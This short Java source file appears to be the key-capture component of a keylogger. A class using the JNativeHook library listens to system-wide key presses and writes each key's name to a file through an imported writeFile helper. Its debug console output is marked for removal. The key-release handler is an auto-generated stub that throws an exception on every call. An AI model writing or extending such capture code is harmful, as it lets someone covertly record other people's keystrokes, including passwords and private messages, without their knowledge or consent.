package my.nativo;

import java.io.IOException;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/*
 * static myTXT class
 */
import static my.file.myTXT.writeFile;

public class keyListener implements NativeKeyListener {

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeEvent) {}

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
        int keyCode = nativeEvent.getKeyCode();
        String keyString = nativeEvent.getKeyText(keyCode);
        System.out.println("Tecla pulsada (Código VK): " + keyCode); // Remove
        System.out.println("Letra: "+keyString); // Remove
        try {
            writeFile(keyString);
        } catch (IOException e) {e.printStackTrace();}
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
        // TODO Auto-generated method stub
        throw new UnsupportedOperationException("Unimplemented method 'nativeKeyReleased'");
    }
    
}
